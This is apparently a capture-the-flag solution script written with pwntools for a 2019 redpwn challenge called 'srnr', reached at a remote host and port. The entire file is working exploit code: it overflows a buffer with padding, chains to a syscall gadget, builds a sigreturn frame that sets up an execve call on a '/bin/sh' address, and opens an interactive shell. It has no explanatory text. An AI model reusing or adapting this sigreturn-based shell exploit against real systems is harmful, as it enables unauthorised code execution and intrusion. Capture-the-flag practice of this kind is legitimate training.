from pwn import *

# p = process('./srnr')
p = remote('chall.2019.redpwn.net', 4008)

p.recvuntil('[#] number of bytes:')
p.sendline('0')
get_int = 0x400710
syscall = 0x400703
bin_sh_addr = 0x400c49

exploit = ''
exploit += 'AAAABBBBCCCCDDDDE'
exploit += p64(get_int)
exploit += p64(syscall)
frame = SigreturnFrame(arch='amd64')
frame.rax = 0x3b
frame.rdi = bin_sh_addr
frame.rsi = 0
frame.rdx = 0
frame.rsp = len(exploit)
frame.rip = syscall
exploit += str(frame)
p.sendline(exploit)
p.sendline('15')

p.interactive()